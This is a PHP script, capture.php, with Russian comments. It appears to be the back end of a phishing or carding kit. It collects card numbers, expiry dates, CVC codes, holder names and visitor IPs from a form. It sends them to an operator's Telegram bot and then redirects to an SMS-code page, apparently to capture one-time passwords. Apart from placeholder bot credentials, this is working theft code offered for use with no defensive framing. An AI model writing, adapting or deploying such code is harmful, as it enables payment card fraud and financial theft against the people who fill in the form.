<?php
// capture.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card = $_POST['card_number'];
    $expiry = $_POST['card_expiry'];
    $cvc = $_POST['card_cvc'];
    $holder = $_POST['card_holder'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');

    // Форматируем сообщение для Telegram
    $message = "💳 *НОВЫЕ ДАННЫЕ КАРТЫ*\n"
             . "Карта: `$card`\n"
             . "Срок: $expiry\n"
             . "CVC: `$cvc`\n"
             . "Держатель: $holder\n"
             . "IP: $ip\n"
             . "Время: $timestamp";

    // Отправляем данные карты в Telegram
    $botToken = 'YOUR_BOT_TOKEN'; // Замените на реальный токен
    $chatId = 'YOUR_CHAT_ID';    // Замените на реальный Chat ID
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?parse_mode=Markdown&chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($telegramUrl); // Отправка запроса

    // Сохраняем данные в сессию для использования на странице SMS
    session_start();
    $_SESSION['card_data'] = ['card' => $card, 'holder' => $holder, 'ip' => $ip];

    // Перенаправляем на страницу ввода SMS
    header('Location: sms.php');
    exit();
}
?>